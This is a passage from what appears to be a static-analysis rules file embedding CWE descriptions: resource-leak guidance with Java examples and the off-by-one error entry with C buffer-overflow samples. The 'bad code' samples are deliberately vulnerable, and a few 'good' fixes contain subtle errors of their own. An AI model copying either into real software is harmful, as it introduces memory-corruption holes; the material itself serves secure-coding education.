Taxonomy Mappings&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-01-12&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Common Consequences, Description,
Likelihood of Exploit, Name, Other Notes, Potential Mitigations, References,
Relationships&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-03-10&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Potential Mitigations&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-05-27&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Description,
Related Attack Patterns&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-07-27&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Relationships&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-10-29&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Type&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-12-28&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Applicable Platforms, Common Consequences,
Demonstrative Examples, Detection Factors, Modes of Introduction,
Observed Examples, Relationships&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2010-02-16&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Alternate Terms, Detection Factors,
Potential Mitigations, References, Relationships&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2010-04-05&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Potential Mitigations&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Previous Entry Names&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Change Date&lt;/th&gt;&lt;th valign="top" nowrap="" colspan="3"&gt;Previous Entry
Name&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;2009-01-12&lt;/td&gt;&lt;td valign="top" colspan="3"&gt;Missing or Inconsistent
Access Control&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="border-bottom:1px solid #BAC5E3" colspan="4"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;

&lt;/html&gt;

&lt;div align="right" style="padding-top:5px; padding-bottom:5px; clear:right" class="noprint"&gt;&lt;a class="backtop" href="#top"&gt;Back to top&lt;/a&gt;&lt;/div&gt;

&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;/html&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_600</key><name>Improper_Resource_Shutdown_or_Release</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Unreleased resources can cause a drain of those available for system use, eventually causing general reliability and availability problems, such as performance degradation, process bloat, and system instability. If a resource leak&amp;nbsp;can be intentionally exploited by an attacker, it may be possible to cause a widespread DoS (Denial of Service) attack. This might even expose sensitive information between unprivileged users, if the resource continues to retain&amp;nbsp;data or user id&amp;nbsp;between subsequent allocations.&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;The application code allocates resource objects, but does not ensure these are always closed and released in a timely manner. This can include database connections, file handles, network sockets, or any other resource that needs to be released.&amp;nbsp;In some cases,&amp;nbsp;these might be released - but only if everything works as planned; if there is any runtime exception during the normal course of system operations, resources start to leak.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;Note that even in managed-memory languages such as Java, these resources must be explicitly released. Many types of resource are not released even when the Garbage Collector runs; and even if the the object would eventually release the resource, we have no control over when the Garbage Collector does&amp;nbsp;run.&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ul&gt;
&lt;li&gt;Always close and release all resources.&lt;/li&gt;
&lt;li&gt;Ensure resources are released (along with&amp;nbsp;any other necessary cleanup) in a &lt;code&gt;finally { }&lt;/code&gt; block. Do not close resources in a &lt;code&gt;catch { }&lt;/code&gt; block, since this is not ensured to be called.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Explicitly call .close() on any instance of a class that implements the &lt;code&gt;Closable&lt;/code&gt; or &lt;code&gt;AutoClosable&lt;/code&gt; interfaces.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Alternatively, an even better solution is to use the try-with-resources idiom, in order to automatically close any defined&amp;nbsp;&lt;code&gt;AutoClosable&lt;/code&gt;&amp;nbsp;instances.&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Unreleased Database Connection&lt;/h4&gt;&lt;pre&gt;private MyObject getDataFromDb(int id)  {
	MyObject data = null;
  
  	try {
		Connection con = DriverManager.getConnection(CONN_STRING);
      	
      	data = queryDb(con, id); 
	}
	catch ( SQLException e ) {
		handleError(e);
	}
}  &lt;/pre&gt;&lt;h4&gt;Explicit Release of Database Connection&lt;/h4&gt;&lt;pre&gt;private MyObject getDataFromDb(int id)  {
	MyObject data = null;
  
  	try {
		Connection con = DriverManager.getConnection(CONN_STRING);
      	
      	data = queryDb(con, id); 
	}
	catch ( SQLException e ) {
		handleError(e);
	}
  	finally {
      	if ((con != null) &amp;&amp; (! con.isClosed())) {
          	con.close();
        }
    }
}  &lt;/pre&gt;&lt;h4&gt;Automatic Implicit Release Using Try-With-Resources&lt;/h4&gt;&lt;pre&gt;private MyObject getDataFromDb(int id)  {
	MyObject data = null;
  
  	try (Connection con = DriverManager.getConnection(CONN_STRING)) {
      	data = queryDb(con, id); 
	}
	catch ( SQLException e ) {
		handleError(e);
	}
}  &lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1654</key><name>Off_by_One_Error</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
	&lt;link href="main.css" rel="stylesheet" type="text/css"&gt;
&lt;div id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table cellpadding="0" cellspacing="0" border="0" width="100%"&gt;&lt;tr&gt;&lt;td valign="top" width="20px"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight:bold;color:white;"&gt;Off-by-one Error&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td valign="top" width="20px"&gt;&lt;div class="left noprint"&gt;

&lt;span class="tool"&gt;&lt;/span&gt;

&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td valign="top" align="left" width="33%" nowrap=""&gt;&lt;b&gt;Weakness ID: &lt;/b&gt;193&lt;span style="font-style:italic; font-size:80%"&gt; (Weakness Base)&lt;/span&gt;&lt;/td&gt;&lt;td valign="top" align="center" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top" align="right" nowrap=""&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Draft"&gt;Draft&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div name="oc_193_Description" id="oc_193_Description" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;A product calculates or uses an incorrect maximum or minimum
value that is 1 more, or 1 less, than the correct value.&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Alternate Terms"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Alternate Terms&lt;/div&gt;&lt;div name="oc_193_Alternate Terms" id="oc_193_Alternate Terms" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;off-by-five:&lt;/th&gt;&lt;td valign="top" width="100%"&gt;

&lt;p&gt;An "off-by-five" error was reported for sudo in 2002 (CVE-2002-0184),
but that is more like a "length calculation" error.&lt;/p&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Time of Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Time of Introduction&lt;/div&gt;&lt;div name="oc_193_Time of Introduction" id="oc_193_Time of Introduction" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;ul&gt;
&lt;li&gt;Implementation&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Applicable Platforms"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Applicable Platforms&lt;/div&gt;&lt;div name="oc_193_Applicable Platforms" id="oc_193_Applicable Platforms" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Languages&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;All&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Demonstrative Examples"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Demonstrative Examples&lt;/div&gt;&lt;div name="oc_193_Demonstrative Examples" id="oc_193_Demonstrative Examples" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="subheading"&gt;Example 1&lt;/p&gt;&lt;p&gt;The following code allocates memory for a maximum number of widgets.
It then gets a user-specified number of widgets, making sure that the user
does not request too many. It then initializes the elements of the array
using InitializeWidget(). Because the number of widgets can vary for each
request, the code inserts a NULL pointer to signify the location of the last
widget.&lt;/p&gt;&lt;div class="indent Bad_Code"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Bad Code)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example
Language: &lt;/span&gt;C&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;int i;&lt;/div&gt;&lt;div style="font-size:90%;"&gt;unsigned int numWidgets;&lt;/div&gt;&lt;div style="font-size:90%;"&gt;Widget **WidgetList;&lt;/div&gt;&lt;div style="font-size:90%;"&gt;&lt;br&gt;&lt;/div&gt;&lt;div style="font-size:90%;"&gt;numWidgets = GetUntrustedSizeValue();&lt;/div&gt;&lt;div style="font-size:90%;"&gt;if ((numWidgets == 0) || (numWidgets &amp;gt; MAX_NUM_WIDGETS))
{&lt;/div&gt;&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;ExitError("Incorrect number of widgets requested!");&lt;/div&gt;
&lt;/div&gt;&lt;div style="font-size:90%;"&gt;}&lt;/div&gt;&lt;div style="font-size:90%;"&gt;WidgetList = (Widget **)malloc(numWidgets * sizeof(Widget
*));&lt;/div&gt;&lt;div style="font-size:90%;"&gt;printf("WidgetList ptr=%p\n", WidgetList);&lt;/div&gt;&lt;div style="font-size:90%;"&gt;for(i=0; i&amp;lt;numWidgets; i++) {&lt;/div&gt;&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;WidgetList[i] = InitializeWidget();&lt;/div&gt;
&lt;/div&gt;&lt;div style="font-size:90%;"&gt;}&lt;/div&gt;&lt;div style="font-size:90%;"&gt;WidgetList[numWidgets] = NULL;&lt;/div&gt;&lt;div style="font-size:90%;"&gt;showWidgets(WidgetList);&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;However, this code contains an off-by-one calculation error. It
allocates exactly enough space to contain the specified number of
widgets, but it does not include the space for the NULL pointer. As a
result, the allocated buffer is smaller than it is supposed to be
(CWE-131). So if the user ever requests MAX_NUM_WIDGETS, there is an
off-by-one buffer overflow when the NULL is assigned. Depending on the
environment and compilation settings, this could cause memory
corruption.&lt;/p&gt;&lt;p class="subheading"&gt;Example 2&lt;/p&gt;&lt;p&gt;The following C/C++ example demonstrates the Off-by-one error in the
main method of a pattern matching utility that looks for a specific pattern
within a specific file. The main method uses the string copy method,
strncpy, to copy the command line user input file name and pattern to the
Filename and Pattern character arrays respectively. &lt;/p&gt;&lt;div class="indent Bad_Code"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Bad Code)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example
Language: &lt;/span&gt;C&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;int main(int argc, char **argv)&lt;/div&gt;&lt;div style="font-size:90%;"&gt;{&lt;/div&gt;&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;char Filename[256];&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;char Pattern[32];&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;&lt;br&gt;&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;&lt;i&gt;/* Validate number of parameters and ensure valid content
*/&lt;/i&gt;&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;...&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;&lt;br&gt;&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;&lt;i&gt;/* copy filename parameter to variable, may cause
off-by-one overflow */&lt;/i&gt;&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;strncpy(Filename, argv[1], sizeof(Filename));&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;&lt;br&gt;&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;&lt;i&gt;/* copy pattern parameter to variable, may cause off-by-one
overflow */&lt;/i&gt;&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;strncpy(Pattern, argv[2], sizeof(Pattern));&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;&lt;br&gt;&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;printf("Searching file: %s for the pattern: %s\n", Filename,
Pattern);&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;Scan_File(Filename, Pattern);&lt;/div&gt;
&lt;/div&gt;&lt;div style="font-size:90%;"&gt;}&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;However, the calls to strncpy use the sizeof method call for the size
parameter that does not take into account that the strncpy will add a
null terminator to each character array. Therefore if a user enters a
filename or pattern that are the same size as (or larger than) their
respective character arrays a null terminator will be added beyond the
end of the buffer for the character arrays creating an off-by-one buffer
overflow. In addition to creating a buffer overflow that may cause a
memory address to be overwritten, if the character arrays are output to
the user through the printf method the memory addresses at the overflow
location may be output to the user.&lt;/p&gt;&lt;p&gt;To fix this problem, be sure to subtract 1 from the sizeof() call to
allow room for the null byte to be added.&lt;/p&gt;&lt;div class="indent Good_Code"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Good Code)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example
Language: &lt;/span&gt;C&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;&lt;i&gt;/* copy filename parameter to variable, no off-by-one overflow
*/&lt;/i&gt;&lt;/div&gt;&lt;div style="font-size:90%;"&gt;strncpy(Filename, argv[2], sizeof(Filename)-1);&lt;/div&gt;&lt;div style="font-size:90%;"&gt;&lt;br&gt;&lt;/div&gt;&lt;div style="font-size:90%;"&gt;&lt;i&gt;/* copy pattern parameter to variable, no off-by-one overflow
*/&lt;/i&gt;&lt;/div&gt;&lt;div style="font-size:90%;"&gt;strncpy(Pattern, argv[3], sizeof(Pattern)-1);&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p class="subheading"&gt;Example 3&lt;/p&gt;&lt;p&gt;Similarly, this example uses the strncat and snprintf functions
incorrectly, failing to account for the null character function will
add.&lt;/p&gt;&lt;div class="indent Bad_Code"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Bad Code)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example
Language: &lt;/span&gt;C&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;char lastname[20];&lt;/div&gt;&lt;div style="font-size:90%;"&gt;char firstname[20];&lt;/div&gt;&lt;div style="font-size:90%;"&gt;char name[40];&lt;/div&gt;&lt;div style="font-size:90%;"&gt;char fullname[40];&lt;/div&gt;&lt;div style="font-size:90%;"&gt;&lt;br&gt;&lt;/div&gt;&lt;div style="font-size:90%;"&gt;strncat(name, firstname, sizeof(name));&lt;/div&gt;&lt;div style="font-size:90%;"&gt;strncat(name, lastname, sizeof(name));&lt;/div&gt;&lt;div style="font-size:90%;"&gt;snprintf(fullname, sizeof(fullname), "%s", name);&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;By leaving a free byte at the end of the buffers for a null character
to be added, the off-by-one weakness is avoided.&lt;/p&gt;&lt;div class="indent Good_Code"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Good Code)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example
Language: &lt;/span&gt;C&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;char lastname[20];&lt;/div&gt;&lt;div style="font-size:90%;"&gt;char firstname[20];&lt;/div&gt;&lt;div style="font-size:90%;"&gt;char name[40];&lt;/div&gt;&lt;div style="font-size:90%;"&gt;char fullname[40];&lt;/div&gt;&lt;div style="font-size:90%;"&gt;&lt;br&gt;&lt;/div&gt;&lt;div style="font-size:90%;"&gt;strncat(name, firstname, sizeof(name)-1);&lt;/div&gt;&lt;div style="font-size:90%;"&gt;strncat(name, lastname, sizeof(name)-1);&lt;/div&gt;&lt;div style="font-size:90%;"&gt;snprintf(fullname, sizeof(fullname)-1), "%s", name);&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p class="subheading"&gt;Example 4&lt;/p&gt;&lt;p&gt;The Off-by-one error can also be manifested when reading characters
of a character array using a for loop that has the incorrect size as a
continuation condition and attempts to read beyond the end of the buffer for
the character array as shown in the following example. &lt;/p&gt;&lt;div class="indent Bad_Code"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Bad Code)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example
Language: &lt;/span&gt;C&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;#define PATH_SIZE 60&lt;/div&gt;&lt;div style="font-size:90%;"&gt;&lt;br&gt;&lt;/div&gt;&lt;div style="font-size:90%;"&gt;char filename[PATH_SIZE];&lt;/div&gt;&lt;div style="font-size:90%;"&gt;&lt;br&gt;&lt;/div&gt;&lt;div style="font-size:90%;"&gt;for(i=0; i&amp;lt;=PATH_SIZE; i++) {&lt;/div&gt;&lt;div style="font-size:90%;"&gt;&lt;br&gt;&lt;/div&gt;&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;char c = getc();&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;if (c == 'EOF') {&lt;/div&gt;
&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;filename[i] = '\0';&lt;/div&gt;
&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;}&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;&lt;br&gt;&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;filename[i] = getc();&lt;/div&gt;
&lt;/div&gt;&lt;div style="font-size:90%;"&gt;}&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;&lt;div class="indent Good_Code"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Good Code)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example
Language: &lt;/span&gt;C&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;for(i=0; i&amp;lt;PATH_SIZE; i++) {&lt;/div&gt;&lt;div style="font-size:90%;"&gt;...&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p class="subheading"&gt;Example 5&lt;/p&gt;&lt;p&gt;As another example the Off-by-one error can occur when using the
sprintf library function to copy a string variable to a formatted string
variable and the original string variable comes from an untrusted source. As
in the following example where a local function, setFilename is used to
store the value of a filename to a database but first uses sprintf to format
the filename. The setFilename function includes an input parameter with the
name of the file that is used as the copy source in the sprintf function.
The sprintf function will copy the file name to a char array of size 20 and
specifies the format of the new variable as 16 characters followed by the
file extension .dat.&lt;/p&gt;&lt;div class="indent Bad_Code"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Bad Code)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example
Language: &lt;/span&gt;C&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;int setFilename(char *filename) { &lt;/div&gt;&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;char name[20]; &lt;/div&gt;
&lt;div style="font-size:90%;"&gt;sprintf(name, "%16s.dat", filename);&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;int success = saveFormattedFilenameToDB(name);&lt;/div&gt;
&lt;div style="font-size:90%;"&gt; return success; &lt;/div&gt;
&lt;/div&gt;&lt;div style="font-size:90%;"&gt;} &lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;However this will cause an Off-by-one error if the original filename
is exactly 16 characters or larger because the format of 16 characters
with the file extension is exactly 20 characters and does not take into
account the required null terminator that will be placed at the end of
the string.&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Observed Examples"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Observed Examples&lt;/div&gt;&lt;div name="oc_193_Observed Examples" id="oc_193_Observed Examples" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Reference&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Description&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0252" target="_blank"&gt;CVE-2003-0252&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-1391" target="_blank"&gt;CVE-2001-1391&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0083" target="_blank"&gt;CVE-2002-0083&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0653" target="_blank"&gt;CVE-2002-0653&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0844" target="_blank"&gt;CVE-2002-0844&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-1568" target="_blank"&gt;CVE-1999-1568&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;/tr&gt;
